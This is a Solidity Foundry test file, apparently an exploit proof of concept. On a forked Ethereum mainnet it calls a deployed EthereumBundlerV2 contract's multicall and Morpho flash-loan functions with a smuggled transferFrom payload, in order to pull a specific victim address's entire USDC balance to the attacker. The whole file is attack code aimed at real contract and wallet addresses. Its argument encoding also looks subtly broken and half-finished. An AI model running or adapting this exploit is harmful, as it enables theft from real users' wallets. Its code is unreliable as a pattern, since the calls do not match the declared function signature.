// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";

interface IEthereumBundlerV2 {
    function multicall(bytes[] calldata data) external payable;
    function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable;
}

contract transferfromTest is Test {
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IEthereumBundlerV2 EtherBundlerV2 = IEthereumBundlerV2(0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077);
    address vic = 0x33421FA588A5c51AAf7Dc772103045D80B92976D;
    address private attacker;
    address morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb; // Replace with actual MORPHO address
    uint256 assets; // Declare but don't initialize yet
    address token = address(usdc); // Address of the token to flash loan

    function setUp() public {
        vm.deal(address(this), 0);
        vm.createSelectFork("https://rpc.ankr.com/eth", 20679724);
        attacker = address(this);

        // Initialize assets here
        assets = usdc.balanceOf(morpho) / 2 / 2; // Amount to flash loan; adjust as needed
    }

    function testfransferfrom() public {
        emit log_named_uint(
            "balance before exploit:",
            usdc.balanceOf(address(this))
        );
        attack();

        emit log_named_uint(
            "balance after exploit:",
            usdc.balanceOf(address(this))
        );
    }

    function attack() internal {
        // Initialize the array with two elements
        bytes[] memory data = new bytes[](2);


        // bytes memory callbackData = abi.encodeWithSelector(
        //     bytes4(0x23b872dd), // transferFrom selector
        //     address(vic),
        //     address(this),
        //     usdc.balanceOf(vic)
        // );

        // Second element: Call morphoFlashLoan with the required parameters
        data[0] = abi.encodeWithSelector(
            bytes4(keccak256("morphoFlashLoan(address,uint256,bytes)")),
            token,
            assets,
            "",
            abi.encodeWithSelector(bytes4(0x23b872dd), address(vic),address(this),usdc.balanceOf(vic))); // Empty data for the callback, adjust as needed

        data[1] = abi.encodeWithSelector(
            bytes4(keccak256("morphoFlashLoan(address,uint256,bytes)")),
            token,
            assets,
            "",
            abi.encodeWithSelector(bytes4(0x23b872dd), address(vic),address(this),usdc.balanceOf(vic)));


        // // First element: Transfer USDC from vic to the attacker
        // data[1] = abi.encodeWithSelector(
        //     bytes4(0x23b872dd), // transferFrom selector
        //     address(vic),
        //     address(this),
        //     usdc.balanceOf(vic)
        // );

        // Call multicall with the two data elements
        EtherBundlerV2.multicall{value: 0}(data);
    }
}
